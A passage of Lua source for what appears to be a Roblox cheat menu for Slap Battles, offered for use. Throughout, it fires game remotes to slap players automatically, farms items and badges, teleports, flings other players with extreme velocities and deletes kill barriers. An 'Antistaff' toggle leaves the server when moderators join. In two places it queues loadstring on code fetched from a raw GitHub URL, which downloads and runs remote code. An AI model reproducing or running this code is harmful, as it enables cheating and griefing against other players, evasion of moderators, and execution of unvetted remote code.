                    end
                end
            end
        else
            -- Clean up when toggled off
            isDetectionEnabled = false
            currentRemoteEvent = nil
            
            -- Clean up connections
            if characterAddedConnection then
                characterAddedConnection:Disconnect()
            end
            if visualUpdateConnection then
                visualUpdateConnection:Disconnect()
            end
        end
    end
})

    local slapples = game.Workspace.Arena.island5.Slapples
    local toggledWNoAutoarena = false
    local SlappleAntiSpam = 0
    local SlappleFarm = SlappleSection:AddToggle("SlappleFarm", 
    {
        Title = "Slapples Autocollect", 
        Description = "Automatically collects slapples for you. Must be in Arena",
        Default = false,
        Callback = function(state)
            if state then
                toggledWNoAutoarena = true
                while toggledWNoAutoarena do
                    task.wait(1)
                    for i, v in pairs(slapples:GetChildren()) do 
                        if v.Glove.Transparency == 0 then
                            if game.Players.LocalPlayer.Character:WaitForChild("isInArena").Value == true then
                                local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                local newPos = oldpos * CFrame.new(0, 3, 0)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Glove.CFrame
                                wait(0.1)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = newPos
                            else
                                if SlappleAntiSpam >= 1 then return end
                                SlappleAntiSpam = SlappleAntiSpam + 1
                                task.delay(7, function()
                                    SlappleAntiSpam = SlappleAntiSpam -1
                                end)
                                Fluent:Notify({
                                    Title = "Slapple Autocollect",
                                    Content = "You must be in the Arena",
                                    SubContent = "", 
                                    Duration = 5 
                                })
                            end
                        end
                    end
                end
            else
                toggledWNoAutoarena = false
            end
        end 
    })
    local toggledWAutoarena = false
    local SlappleFarmToggleWArena = SlappleSection:AddToggle("SlappleFarmArena", 
    {
        Title = "Slapples Autocollect w/ auto arena", 
        Description = "Automatically collects slapples for you, will automatically enter the arena for the slapple",
        Default = false,
        Callback = function(state)
            if state then
                toggledWAutoarena = true
                while toggledWAutoarena do
                    task.wait(1)
                    for i, v in pairs(slapples:GetChildren()) do 
                        if v.Glove.Transparency == 0 then
                            if game.Players.LocalPlayer.Character:WaitForChild("isInArena").Value == true then
                                local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                local newPos = oldpos * CFrame.new(0, 3, 0)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Glove.CFrame
                                wait(0.1)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = newPos
                            else
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace:FindFirstChild("Lobby").Teleport1.CFrame
                                wait(0.03)
                                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Glove.CFrame
                                 if v.Glove.Transparency and v.Glove.Transparency == 1 then
                                 game.Players.LocalPlayer.Character.Humanoid.Health = 0
                                 end
                            end
                        end
                    end
                end
            else
               
                toggledWAutoarena = false
            end
        end 
    })
_G.AlreadyFree = false

Misc:AddButton({
    Title = "Free Emotes",
    Description = "Fully FE. Laugh won't work. \n\n/e Thriller",
    Callback = function()
        if _G.AlreadyFree then return end
        _G.AlreadyFree = true
        
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        local animations = {}
        local currentAnimationTrack = nil
        
        for _, anim in pairs(ReplicatedStorage:WaitForChild("AnimationPack"):GetChildren()) do
            local animation = Instance.new("Animation")
            animation.AnimationId = anim.AnimationId
            animations[string.lower(anim.Name)] = animation
        end
        
        player.Chatted:Connect(function(msg)
            msg = string.lower(msg)
            local command = msg:match("^/e%s+(%w+)")
            if command and animations[command] then
                if currentAnimationTrack then
                    currentAnimationTrack:Stop()
                end
                currentAnimationTrack = humanoid:LoadAnimation(animations[command])
                currentAnimationTrack:Play()
            end
        end)
        
        humanoid.Running:Connect(function(speed)
            if speed > 0 and currentAnimationTrack then
                currentAnimationTrack:Stop()
                currentAnimationTrack = nil
            end
        end)
    end
})

local FriendsDisabled = SlapsSection:AddToggle("Friends Disable", 
{
    Title = "Don't hit friends", 
    Description = "Your slap aura will stop detecting friends.",
    Default = false,
    Callback = function(state)
	if state then
	    ToggleFriendsSlapAura = true
	else
	    ToggleFriendsSlapAura = false
        end
    end 
})
local GloveEquipNecessary = SlapsSection:AddToggle("GloveEquipNecessary", 
{
    Title = "On glove equip only", 
    Description = "Only slaps when your glove is equipped. Otherwise, it will not slap them",
    Default = GloveNecessary,
    Callback = function(state)
	GloveNecessary = state
    end 
})
  local active = false
local player = game.Players.LocalPlayer

local slapCooldown = 0.8
local lastSlapTime = 0
local slapamountantikick = 0

local function getHumanoidRootPart()
    return player.Character and player.Character:FindFirstChild("HumanoidRootPart")
end

local function removeslapantikickafter1s()
    slapamountantikick = math.max(0, slapamountantikick - 1)
end

local function resetToolIfNotDefault()
    local character = player.Character
    local backpack = player.Backpack

    if character then
        local tool = character:FindFirstChildWhichIsA("Tool")
        if tool and tool.Name ~= "Default" then
            character:FindFirstChild("Humanoid").Health = 0
        end
    elseif backpack then
        local tool = backpack:FindFirstChildWhichIsA("Tool")
        if tool and tool.Name ~= "Default" then
            character:FindFirstChild("Humanoid").Health = 0
        end
    end
end
local boxingslapping = false




local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer
local isFarmRunning = false


local function getCharacter()
    local character = player.Character or player.CharacterAdded:Wait()
    return character
end


local function startFarm()
    local retryCount = 0  
    local maxRetries = 40  

    while isFarmRunning do
  
        local character = getCharacter()
        local hrp = character:WaitForChild("HumanoidRootPart")

    
        local part = nil
        for _, child in ipairs(workspace:GetChildren()) do
          
            if child:IsA("Model") and string.match(child.Name, "^Å" .. game.Players.LocalPlayer.Name .. "$") then
                part = child
                break 
            end
        end

   
        if part and part:FindFirstChild("HumanoidRootPart") then
            game.ReplicatedStorage.b:FireServer(part.HumanoidRootPart)
            retryCount = 0  
        else
            retryCount = retryCount + 1 
        end

       
        if retryCount >= maxRetries then
            isFarmRunning = false
            Fluent:Notify({
                Title = "Farm Stopped",
                Content = "The farm has stopped because the clone did not exist.",
                Duration = 5
            })
            break 
        end

        task.wait(0.01)  
    end
end

local Toggle = SlappleSection:AddToggle("Slapfarm", {
    Title = "Slap Farm",
    Description = "Default/Default Arena. Fully automated. Currently buggy.",
    Default = false,
    Callback = function(state)
        active = state

        if active then
            resetToolIfNotDefault()

            task.spawn(function()
                while active do
                    local success, err = pcall(function()
                        if player.Character and player.Character:FindFirstChild("isInArena") and not player.Character.isInArena.Value then
                            if player.leaderstats.Glove.Value ~= "Dual" and  player.leaderstats.Glove.Value ~= "Plague" then
                              player.Character.HumanoidRootPart.CFrame = workspace:FindFirstChild("Lobby"):FindFirstChild("Teleport2").CFrame
                            else
                                player.Character.HumanoidRootPart.CFrame = workspace:FindFirstChild("Lobby"):FindFirstChild("Teleport1").CFrame
                            end
                            task.wait(0.5)
                            return
                        end

                        local humanoidRootPart = getHumanoidRootPart()

if humanoidRootPart then
    for _, playerTarget in ipairs(game.Players:GetPlayers()) do
        if playerTarget ~= player and playerTarget.Character then
            local targetRootPart = playerTarget.Character:FindFirstChild("HumanoidRootPart")

            if targetRootPart then
                local distance = (humanoidRootPart.Position - targetRootPart.Position).Magnitude
                if distance < 19 and slapamountantikick < 4 then
                    if not playerDebounces[playerTarget.Name] then
                        local currentTime = tick()
                        if currentTime - lastSlapTime >= slapCooldown then
                            playerDebounces[playerTarget.Name] = true
                            lastSlapTime = currentTime
                            if game.Players.LocalPlayer.leaderstats.Glove.Value == "Default" or game.Players.LocalPlayer.Character:FindFirstChild("Default") or game.Players.LocalPlayer.Backpack:FindFirstChild("Default") then
    
                              game.ReplicatedStorage.b:FireServer(targetRootPart)
                            elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Dual"  or game.Players.LocalPlayer.Character:FindFirstChild("Dual") or game.Players.LocalPlayer.Backpack:FindFirstChild("Dual") then
                                game.ReplicatedStorage.GeneralHit:FireServer(targetRootPart)
                            elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Plague"  or game.Players.LocalPlayer.Character:FindFirstChild("Plague") or game.Players.LocalPlayer.Backpack:FindFirstChild("Plague") then
                                game.ReplicatedStorage.PlagueHit:FireServer(targetRootPart)
                            end
                            slapamountantikick = slapamountantikick + 1

                            task.delay(0.5, function()
                                playerDebounces[playerTarget.Name] = nil
                            end)
                            task.delay(2.5, removeslapantikickafter1s)
                        end
                    end
                end
            end
        end
    end
end

                    end)

                    if not success then
                        warn("Error in Slap Farm logic:", err)
                    end

                    task.wait(0.1)
                end
            end)

            task.spawn(function()
                while active do
                    local success, err = pcall(function()
                        if player.Character and player.Character:FindFirstChild("isInArena") and not player.Character.isInArena.Value then
                            if player.leaderstats.Glove.Value ~= "Dual" and player.leaderstats.Glove.Value ~= "Plague" then
                                player.Character.HumanoidRootPart.CFrame = workspace:FindFirstChild("Lobby"):FindFirstChild("Teleport2").CFrame
                            else
                                player.Character.HumanoidRootPart.CFrame = workspace:FindFirstChild("Lobby"):FindFirstChild("Teleport1").CFrame
                            end
                            task.wait(1.3)
                            return
                        end
                        

                        local players = game.Players:GetPlayers()
                        local randomPlayer = nil

                        repeat
                            randomPlayer = players[math.random(1, #players)]
                        until randomPlayer and randomPlayer ~= player and randomPlayer.Character and randomPlayer.Character:FindFirstChild("isInArena") and randomPlayer.Character.isInArena.Value

                        if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("Humanoid") then
                            local humanoid = randomPlayer.Character.Humanoid

                            if humanoid.Health > 0 then
                                local connection
                                connection = game:GetService("RunService").Stepped:Connect(function()
                                    if randomPlayer.Character and randomPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 7, 5))
                                    end
                                end)

                                task.wait(0.1)

                                if connection then
                                    connection:Disconnect()
                                end
                            end
                        end
                    end)

                    if not success then
                        warn("Error in targeting logic:", err)
                    end

                    task.wait(0.7)
                end
            end)
        else
            active = false
        end
    end
})

    task.spawn(function()
        game.Players.LocalPlayer.leaderstats.Glove.Changed:Connect(function()
            if isDetectionEnabled then
                ToggleSA:SetValue(false)
                task.wait(0.1)
                ToggleSA:SetValue(true)
            end
        end)
    end)
    local RunService = game:GetService("RunService")
	if _G.ToggledSlapStick ~= true then 
 		_G.ToggledSlapStick = false
	else
		_G.ToggledSlapStick = true
	end
    local Togglestar = CauseLag:AddToggle("Star", 
    {
        Title = "Star", 
        Description = "Become a star, which you already are. May cause lag to server.",
        Default = _G.ToggledSlapStick,
        Callback = function(state)
		_G.ToggledSlapStick = state
	
		
        end
    })
		task.spawn(function()
	while true do
		if _G.ToggledSlapStick then
         game:GetService("ReplicatedStorage").slapstick:FireServer("fullcharged")
		 game:GetService("ReplicatedStorage").slapstick:FireServer("dash")
			task.wait()
			else
			task.wait(0.15)
		end
		end
		end)
    Misc:AddButton({
        Title = "Rejoin",
        Description = "Rejoins the same server. The UI doesn't load automatically.",
        Callback = function()
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
        end
    }) 
    local RetroSelected = "None" 
    
    local DropdownFprRetrp = Misc:AddDropdown("Dropdown", {
        Title = "Retro Ability Spam",
        Description = "Retro Ability Spam duh",
        Values = {"None", "Hammer", "Rocket Launcher", "Bomb"},
        Multi = false,
        Default = "None",
        Callback = function(selectedValue)
            RetroSelected = selectedValue
            while wait(0.1) do
        if RetroSelected ~= nil and RetroSelected ~= "None" then
            if RetroSelected == "Hammer" then
                game:GetService("ReplicatedStorage"):WaitForChild("RetroAbility"):FireServer("Ban Hammer")
            elseif RetroSelected == "Rocket Launcher" then
                game:GetService("ReplicatedStorage"):WaitForChild("RetroAbility"):FireServer("Rocket Launcher")
            elseif RetroSelected == "Bomb" then
                game:GetService("ReplicatedStorage"):WaitForChild("RetroAbility"):FireServer("Bomb")
            end
        end
            end
        end
    })
    
    
     local antiiicenable = false
	

     local ToggleAntiIce = Tabs.Antis:AddToggle("AntiIce", 
    
    {
        Title = "Disables Ice Effect", 
        Description = "",
        Default = false,
        Callback = function(state)
        if state then
            antiiicenable = true
            while wait(0.06) do
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if v.Name == "Icecube" and antiiicenable == true then
                        v:Destroy()
                        game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
                        game.Players.LocalPlayer.Character.Humanoid.AutoRotate = true
                    end
                end
             end
        else
           antiiicenable = false
            end
        end 
    })
    local AntiKnockoff = false
    local AntiKnockoffToggle = Tabs.Antis:AddToggle("AntiKnockoff", 
    
    {
       Title = "AntiKnockoff", 
       Description = "Disables the knockoff camera effect.",
       Default = false,
       Callback = function(state)
       if state then
            AntiKnockoff = true
            while AntiKnockoff do 
            for _,v in pairs(game.Players:GetChildren()) do
                if active == 1 and game.Workspace.CurrentCamera and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and game.Workspace.CurrentCamera.CameraSubject ~= game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and game.Workspace.CurrentCamera.CameraSubject == game.Workspace:FindFirstChild(game.Players.LocalPlayer.Name.."'s_falsehead") then
                    game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                end
                task.wait()
            end
        end
       else
         AntiKnockoff = false
           end
       end 
    })
    Tabs.Main:AddButton({
        Title = "Potion",
        Description = "FE. Credits: F00TWARE",
        Callback = function()
            local potionTemplate = game:GetService("ReplicatedStorage"):WaitForChild("Alchemist Assets"):WaitForChild("potion_template")
    
    local function exploitPotionTemplate()
        local player = game.Players.LocalPlayer
        local character = player.Character or player:WaitForChild("Character")
        
        local clonedPotion = potionTemplate:Clone()
        clonedPotion.Parent = player.Backpack
    
        if clonedPotion:FindFirstChild("Activate") then
            clonedPotion.Activate:Fire() 
        end
    
    end
    
    exploitPotionTemplate()
        end
    })
    GloveObtainment:AddButton({
        Title = "Get Iceskate",
        Description = "Instantly obtains.",
        Callback = function()
            game:GetService("ReplicatedStorage").IceSkate:FireServer("Freeze")
        end
    })
    
    GloveObtainment:AddButton({
    Title = "Get Glovel (all gloves)",
    Description = "Automatically completes quests and opens the treasure chest for all gloves.",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character

       if character and character:FindFirstChild("entered") and game:GetService("Players").LocalPlayer:WaitForChild("Quests"):WaitForChild("QuestsActive"):GetAttribute("_questChainHitmansHandkerchief") == true then

            repeat
                task.wait()
                character.HumanoidRootPart.CFrame = CFrame.new(289, 13, 261)
                game:GetService("ReplicatedStorage").DigEvent:FireServer({
                    ["index"] = 2,
                    ["cf"] = CFrame.new(
                        42.7222366, -6.17449856, 91.5175781,
                        -0.414533257, 1.72594355e-05, -0.91003418,
                        -5.57037238e-05, 1, 4.4339522e-05,
                        0.91003418, 6.90724992e-05, -0.414533257
                    )
                })
            until game.Workspace:FindFirstChild("TreasureChestFolder") ~= nil
                and game.Workspace.TreasureChestFolder:FindFirstChild("TreasureChest") ~= nil

            task.wait(1)

            local chestFolder = game.Workspace.TreasureChestFolder
            if chestFolder and chestFolder:FindFirstChild("TreasureChest") then
                chestFolder.TreasureChest.OpenRemote:FireServer()
            end

            task.wait(0.9)
           Fluent:Notify({
                Title = "Auto Glovel",
                Content = "I'm refusing to automate this part",
                SubContent = "Just reset and go claim it bruh.",
                Duration = 9
})
        else
            Fluent:Notify({
                Title = "Error",
                Content = "You must accept the quest, or be in the arena.",
                Duration = 5
            })
        end
    end
})


    GloveObtainment:AddButton({
    Title = "Get Bomb",
    Description = "Attempts to get the Glove Bomb if conditions are met.",
    Callback = function()
        local player = game.Players.LocalPlayer
        local leaderstats = player:FindFirstChild("leaderstats")
        local glove = leaderstats and leaderstats:FindFirstChild("Glove")
        local badgeService = game:GetService("BadgeService")
        local badgeId = 2124919840

        if glove and glove.Value == "Warp" and not badgeService:UserHasBadgeAsync(player.UserId, badgeId) then
            local oldTouch = workspace.DEATHBARRIER.CanTouch
            local players = game.Players:GetChildren()
            local randomPlayer

            repeat
                randomPlayer = players[math.random(1, #players)]
            until randomPlayer ~= player and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") and randomPlayer.Character:FindFirstChild("Ragdolled") and not randomPlayer.Character.Ragdolled.Value

            if randomPlayer and randomPlayer.Character then
                local target = randomPlayer
                player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
                task.wait(0.2)
                game.ReplicatedStorage.WarpHt:FireServer(target.Character:WaitForChild("HumanoidRootPart"))
                task.wait(0.15)

                if workspace.DEATHBARRIER.CanTouch then
                    player.Character.HumanoidRootPart.CFrame = workspace.DEATHBARRIER.CFrame
                else
                    workspace.DEATHBARRIER.CanTouch = true
                    player.Character.HumanoidRootPart.CFrame = workspace.DEATHBARRIER.CFrame
                end

                task.wait(0.1)
                game.ReplicatedStorage.WLOC:FireServer()
                task.wait(0.2)
                workspace.DEATHBARRIER.CanTouch = oldTouch
            end
        else
            Fluent:Notify({
                Title = "Error",
                Content = "You don't have Warp equipped, or you already have the badge.",
                Duration = 5
            })
        end
    end
})

    GloveObtainment:AddButton({
        Title = "Get Court Evidence Badge",
        Description = "Instantly obtains.",
        Callback = function()
            fireclickdetector(workspace.Lobby.Scene.knofe.ClickDetector)
        end
    })
    GloveObtainment:AddButton({
        Title = "Get Duck Badge",
        Description = "Instantly obtains.",
        Callback = function()
            fireclickdetector(workspace.Arena["default island"]["Rubber Ducky"].ClickDetector)
        end
    })
    
    GloveObtainment:AddButton({
        Title = "Go to elude",
        Description = "Choose if you want to get Counter or elude instantly.",
        Callback = function()
            Window:Dialog({
                Title = "You are teleporting to elude",
                Content = "You must re-execute the same loadstring.",
                Buttons = {
                    { 
                        Title = "Got it",
                        Callback = function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-502.336, 14.228, -179.597)
                            game:GetService("TeleportService"):Teleport(11828384869, game.Players.LocalPlayer)
                            local function queueteleportfunction1()
                                if queueteleport then
                                        task.wait(0.1) 
                                            local scriptURL = "https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/refs/heads/main/lol.txt"
                                            queueteleport("loadstring(game:HttpGet('" .. scriptURL .. "'))()")
                                        
                                else
                                    warn("queueteleport function is not defined!")
                                end
                            end
                            queueteleportfunction1()
                            queueteleportfunction1()
                            queueteleportfunction1()
                            queueteleportfunction1()
                            queueteleportfunction1()
                            
                        end 
                    }, {
                        Title = "Cancel",
                       
                    }
                }
            })
           
        end
    })
    
    AntivoidSection:AddButton({
        Title = "Deleted Kill Parts",
        Description = "Not reversable yet. (im too lazy)",
        Callback = function()
            if game.Workspace:FindFirstChild("AntiDefaultArena") then
                game.Workspace:FindFirstChild("AntiDefaultArena"):Destroy()
                game.Workspace:FindFirstChild("ArenaBarrier"):Destroy()
                game.Workspace:FindFirstChild("DEATHBARRIER"):Destroy()
                game.Workspace:FindFirstChild("DEATHBARRIER2"):Destroy()
                Fluent:Notify({
                    Title = "Deleted Kill Parts",
                    Content = "irreverseable, must rejoin to get them back.",
                    SubContent = "SubContent", 
                    Duration = 5 
                })
            end
        end
    })
    
    local Players = game:GetService("Players")
    local antifling
    local isActive = false
    
    local function startAntifling(speaker)
        if isActive then return end
        isActive = true
        antifling = RunService.Stepped:Connect(function()
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= speaker and player.Character then
                    for _, v in pairs(player.Character:GetDescendants()) do
                        if v:IsA("BasePart") then
                            v.CanCollide = false
                        end
                    end
                end
            end
        end)
    end
    
    local function stopAntifling()
        if antifling then
            antifling:Disconnect()
            antifling = nil
        end
        isActive = false
    end
    
    
    local ToggleForEXPAntifling = GeneralSec:AddToggle("AntiflingEXPToggle", 
    {
        Title = " Antifling", 
        Description = "Enables/disables antifling against exploiters. May cause lag on high player servers.",
        Default = false,
        Callback = function(state)
            local speaker = Players.LocalPlayer
            if state then
              
                startAntifling(speaker)
            else
          
                stopAntifling()
            end
        end
    })
    local DropdownTps = MiscellaneousSection:AddDropdown("Dropdown", {
        Title = "Teleports",
        Description = "Teleport to a chosen location.",
        Values = {"Tournament", "Normal Arena", "Default Arena", "Hideout","Plate"},
        Multi = false,
        Default = "None",
        Callback = function(selectedValue)
           if selectedValue == "Tournament" then
            game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(3352.141357421875, 144.05422973632812, -19.1132755279541)
           elseif selectedValue == "Normal Arena" then
            game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-19.010316848754883, -5.172852039337158, 9.09486198425293)
           elseif selectedValue == "Default Arena" then
            game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(123.12822723388672, 359.9842224121094, -0.508453905582428)
            elseif selectedValue == "Hideout" then
                game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-14737.7978515625, 3191.704345703125, -29370.4921875)
            elseif selectedValue == "Plate" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Arena.Plate.CFrame
            end
        end
    })
    local DropdownGameTps = MiscellaneousSection:AddDropdown("Dropdown", {
        Title = "Game Teleports",
        Description = "Teleport to a selected place.",
        Values = {"Christmas Place", "Ice Trials", "Slap League"},
        Multi = false,
        Default = "None",
        Callback = function(selectedValue)
           if selectedValue == "Christmas Place" then
             game:GetService("TeleportService"):Teleport(15507333474,game.Players.LocalPlayer)
             local function queueteleportfunction()
                if queueteleport then
                    repeat
                        task.wait(0.1)   
                        if game.Workspace:FindFirstChild("blinkGloveAbility") then
                            local scriptURL = "https://raw.githubusercontent.com/vinqDevelops/erwwefqweqewqwe/refs/heads/main/lol.txt"
                            queueteleport("loadstring(game:HttpGet('" .. scriptURL .. "'))()")
                        end
                    until game.Workspace:FindFirstChild("blinkGloveAbility")
                else
                    warn("queueteleport function is not defined!")
                end
            end
            queueteleportfunction()
           elseif selectedValue == "Ice Trials" then
            game:GetService("TeleportService"):Teleport(17290438723,game.Players.LocalPlayer)
           elseif selectedValue == "Slap League" then
            game:GetService("TeleportService"):Teleport(18698003301,game.Players.LocalPlayer)
            end
        end
    })
    local player = game.Players.LocalPlayer
    local walkflinging = false
    local root = nil
    local humanoid = nil
    local humanoidDiedConnection = nil
    
    local function startWalkFling()
 
        humanoid = player.Character and player.Character:FindFirstChildWhichIsA("Humanoid")
        if humanoid then
     
            humanoidDiedConnection = humanoid.Died:Connect(function()
                walkflinging = false
             
            end)
        end
    
        walkflinging = true
    
        coroutine.wrap(function()
            repeat
                game:GetService("RunService").Heartbeat:Wait()
                local character = player.Character
                root = character:FindFirstChild("HumanoidRootPart")
                local vel, movel = nil, 0.1
    
                while not (character and character.Parent and root and root.Parent) do
                    game:GetService("RunService").Heartbeat:Wait()
                    character = player.Character
                    root = character:FindFirstChild("HumanoidRootPart")
                end
    
                vel = root.Velocity
                root.Velocity = vel * 1000000 + Vector3.new(0, 1000000, 0)
    
                game:GetService("RunService").RenderStepped:Wait()
                if character and character.Parent and root and root.Parent then
                    root.Velocity = vel
                end
    
                game:GetService("RunService").Stepped:Wait()
                if character and character.Parent and root and root.Parent then
                    root.Velocity = vel + Vector3.new(0, movel, 0)
                    movel = movel * -1
                end
            until walkflinging == false
        end)()
    end
    
    local function stopWalkFling()
        walkflinging = false
      
        if humanoidDiedConnection then
            humanoidDiedConnection:Disconnect()
            humanoidDiedConnection = nil 
        end
    end
    
    local ToggleWalkFling
    ToggleWalkFling = MiscellaneousSection:AddToggle("Walkflingtoggle", 
    {
        Title = " Walk 2 fling", 
        Description = "Walk into people to fling. Disables on death",
        Default = false,
        Callback = function(state)
        game.Players.LocalPlayer.Character.Humanoid.Died:Connect(function()
          ToggleWalkFling:SetValue(false)
        end)
    
         if state then
                startWalkFling() 
            else
                stopWalkFling() 
                
            end
        end 
    })
    

    local function setupCharacter(character)
        local humanoid = character:WaitForChild("Humanoid")
 
        humanoid.Died:Connect(function()
            Used = false
        end)
    
        character.ChildRemoved:Connect(function(child)
            if child.Name == "InLobby" and using then
                wait(0.1)
                workspace.BountyHunterRoom.BountyHunterBooth._configPart.OpenRemote:InvokeServer()
                wait(0.7)
                workspace.BountyHunterRoom.BountyHunterBooth._configPart.LeaveRemote:FireServer()
                Used = true
                wait(0.8)
                if game.Workspace:FindFirstChild(game.Players.LocalPlayer.Name) then
                    game.Workspace:FindFirstChild(game.Players.LocalPlayer.Name).isInArena.Value = true
                end
            end
        end)
    end
    
    player.CharacterAdded:Connect(function(character)
        thecharforinv = character
        setupCharacter(character)
    end)
    
    if player.Character then
        setupCharacter(player.Character)
    end
    local SlapAuraSlider = SlapsSection:AddSlider("SlapAuraSlider", 
    {
        Title = "Slap Aura Reach",
        Description = "Not more than 17 recommended, unless EXTENDED glove or massive lag.",
        Default = _G.detectionRadius,
        Min = 5,
        Max = 30,
        Rounding = 1,
        Callback = function(Value)
            _G.detectionRadius = tonumber(Value)
        end
    })
	    Misc:AddButton({
        Title = "Sbeve All",
        Description = "Sbeve each player.",
        Callback = function()
            local Players = game:GetService("Players")

local Part1 = game.Players.LocalPlayer.Character:FindFirstChild("stevebody")

if not Part1 then
    Fluent:Notify({
        Title = "Sbeve All",
        Content = "Turn into an Sbeve first!",
        SubContent = "", 
        Duration = 3 
})
    return
end


for _, player in pairs(Players:GetPlayers()) do
    if player.Character then
        local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            firetouchinterest(Part1, humanoidRootPart, 0)
            task.wait()
            firetouchinterest(Part1, humanoidRootPart, 1) 
        end
    end
end
        end
    })
    local SlapAuraSliderDetect = SlapsSection:AddSlider("SlapAuraSliderDetect", 
    {
        Title = " Slap Aura Player Detect",
        Description = "The higher, the more players you can slap in 2.3 seconds, but may result in a higher chance of getting kicked.",
        Default = 2,
        Min = 1,
        Max = 10,
        Rounding = 0,
        Callback = function(Value)
            slapamountantikickmaxed = Value
        end
    })
    local ToggleVisualDisplay = SlapsSection:AddToggle("VisualDisplay", 
    {
        Title = " Visual Slap Aura", 
        Description = "Display the Reach of the slap aura under your body. Slap Aura must be ON for this to work.",
        Default = false,
        Callback = function(state)
        if state then
           displayvisually = true
        else
            displayvisually = false
         
            end
        end 
    })
	local RemoveSlapCD = SlapsSection:AddToggle("MyToggle", {
    Title = "Remove Slap Cooldown", 
    Description = "Removes slap Cooldown and makes it like Overkill's glove slap cooldown!",
    Default = false,
    Callback = function(state)
        toggleEnabled69420 = state
       
    end 
})
    local AntiBrazil = GeneralSec:AddToggle("Antibrazil", 
    {
        Title = "Antibrazil", 
        Description = "Disables brazil",
        Default = false,
        Callback = function(state)
        if state then
            for _, v in pairs(game.Workspace.Lobby.brazil:GetChildren()) do
                if v:IsA("BasePart") then
                    v.CanTouch = false
                end
            end
        else
            for _, v in pairs(game.Workspace.Lobby.brazil:GetChildren()) do
                if v:IsA("BasePart") then
                    v.CanTouch = true
                end
            end
            end
        end 
    })
    
    MiscellaneousSection:AddButton({
        Title = "go to brazil",
        Description = "",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.workspace.Lobby.brazil.portal.CFrame
        end
    })
  


    local antistaffing = false
    local antirock = false
    GeneralSec:AddToggle("Antirock", 
    {
        Title = "Antirock", 
        Description = "Disables the effects from rocks",
        Default = false,
        Callback = function(state)
        
        if state then
            antirock = true
            while antirock do
                task.wait(0.2) 
                for _, v in pairs(game.Players:GetPlayers()) do
                    if v.Character and v.Character:FindFirstChild("rock") then
                        local rock = v.Character:FindFirstChild("rock")
    
                        if rock then
                            rock.CanTouch = false
                            rock.CanQuery = false
                        end
                    end
                end
    
            end
        else
            antirock = false
            end
        end 
    })
    
    GeneralSec:AddToggle("Antistaff", 
    {
        Title = "Antistaff", 
        Description = "Detects when staff members join. If one joins, you get kicked.",
        Default = false,
        Callback = function(state)
        
        if state then
            antistaffing = true
            while antistaffing do
                task.wait()
                    for i, v in pairs(game.Players:GetChildren()) do
                        if v and v:GetRankInGroup(9950771) >= 2 and antistaffing == true then
                    game.Players.LocalPlayer:Kick("Staff Detected.".." ("..v.Name..")")
                    break
                end
                        
                end
            end
            
        else
            antistaffing = false
            end
        end 
    })
    
    
    
    
    local walkspeed = Tabs.Settings:AddSlider("walkspeed", 
    {
        Title = "WalkSpeed",
        Description = "Determines your speed.",
        Default = 20,
        Min = 20,
        Max = 300,
        Rounding = 1,
        Callback = function(Value)
            game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = Value
        end
    })
    Tabs.Settings:AddSlider("JumpPower", 
    {
        Title = "JumpPower",
        Description = "Determines how high you jump.",
        Default = 50,
        Min = 50,
        Max = 500,
        Rounding = 1,
        Callback = function(Value)
            game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = Value
        end
    })
    MiscellaneousSection:AddButton({
        Title = "Enable inArena",
        Description = "Use this if your slap aura is not working. Must be used in the Arena",
        Callback = function()
            game.Players.LocalPlayer.Character:FindFirstChild("isInArena").Value = true
        end
    })
    GloveObtainment:AddButton({
        Title  = "Get Kinetic",
        Callback = function()
    if game.Players.LocalPlayer.leaderstats.Glove.Value == "Stun" then
            OGL = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                for i = 1,150 do
                game.ReplicatedStorage.SelfKnockback:FireServer({["Force"] = 0,["Direction"] = Vector3.new(0,0.01,0)})
                wait(0.05)
                end
        wait(1.5)
    repeat
    local players = game.Players:GetChildren()
    local RandomPlayer = players[math.random(1, #players)]
